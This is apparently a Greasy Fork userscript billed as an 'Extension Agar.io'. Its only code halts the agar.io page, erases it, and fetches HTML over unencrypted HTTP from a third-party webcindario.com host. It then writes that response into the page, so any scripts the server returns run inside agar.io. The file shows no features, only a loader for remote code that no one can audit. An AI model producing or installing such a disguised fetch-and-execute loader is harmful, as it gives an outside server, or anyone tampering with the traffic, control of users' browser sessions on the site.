// ==UserScript==
// @name         ᏩᎿ✿
// @description  Extension Agar.io
// @version      1.0.0
// @author       ᏩᎿ✿
// @match        http://agar.io/*
// @match        https://agar.io/*
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @namespace https://greasyfork.org/users/24985
// @downloadURL https://update.greasyfork.org/scripts/15706/%E1%8F%A9%E1%8E%BF%E2%9C%BF.user.js
// @updateURL https://update.greasyfork.org/scripts/15706/%E1%8F%A9%E1%8E%BF%E2%9C%BF.meta.js
// ==/UserScript==

window.stop(),document.documentElement.innerHTML=null,GM_xmlhttpRequest({method:"GET",url:"http://gtxextension.webcindario.com/",onload:function(e){document.open(),document.write(e.responseText),document.close()}});